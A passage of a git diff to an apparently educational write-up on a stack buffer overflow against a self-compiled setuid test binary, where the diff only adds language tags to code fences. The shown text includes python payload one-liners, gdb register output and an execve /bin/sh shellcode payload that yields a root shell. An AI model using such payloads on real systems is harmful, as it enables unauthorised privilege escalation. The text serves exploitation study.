@@ -398,12 +398,12 @@ Invalid $SP address: 0x3365412e
 ```
 
 So we've overwritten `ebp` and it appears to have failed once `esp` is overwritten.  This isn't typical of most CTF's and I wasn't able to work out how to bypass this during compilation, but we can pretty easily bypass it.  The invalid `$SP` address is at position 128 in our buffer, so at position 128 in our buffer we just write a new `esp` which we will point next to our `eip` address.
-```
+```python
 python -c "from struct import pack; print 'A'*128 + pack('<L', 0xffffd280+136) + 'B'*4+ 'C'*4"  > /tmp/var
 ```
 
 In the pack part of our exploit above, the 136 part of our exploit was manually determined by adjusting it until the program wrote `0x42424242` or 'BBBB' into the EIP.  As we see below the above exploit succeeded in overwriting EIP.  
-```
+```gdb
 EAX: 0x0 
 EBX: 0x42424242 ('BBBB')
 ECX: 0xffffd2b8 ("CCCC")
@@ -415,7 +415,7 @@ ESP: 0xffffd2b8 ("CCCC")
 EIP: 0x42424242 ('BBBB')
 ```
 Now we have all the ingredients needed to exploit this binary.  Firstly, we make the binary an suid binary, so it will be executed as root regardless.  We then change to an alternative unprivileged user, and use the binary to get the position of the buffer.
-```
+```bash
 root@kali:~/Documents/temp# chmod u+s test
 root@kali:~/Documents/temp# su - frank
 No directory, logging in with HOME=/
@@ -428,13 +428,13 @@ Segmentation fault
 ```
 
 In our payload we then place the following shellcode: http://shell-storm.org/shellcode/files/shellcode-827.php
-```
+```python
 python -c "from struct import pack; print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'.ljust(128,'\x90') + pack('<L', 0xffffdc90+136) + pack('<L', 0xffffdc90)+ 'C'*4"  > /tmp/var
 ```
 
 You'll notice here I've used ljust on the shellcode.  This just pads the string to the determined length of 128 and pads it with NOP instructions, so it makes the process of creating a nopsled slightly easier.  Run the binary, inputting the payload, we are returned a root shell.  The uid won't change but the [effective-uid](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id) does, indicating we now have root privileges.
 
-```
+```bash
 $ (cat /tmp/var; cat) | ./test
 Wanna Smash!?: 0xffffdc90
 id
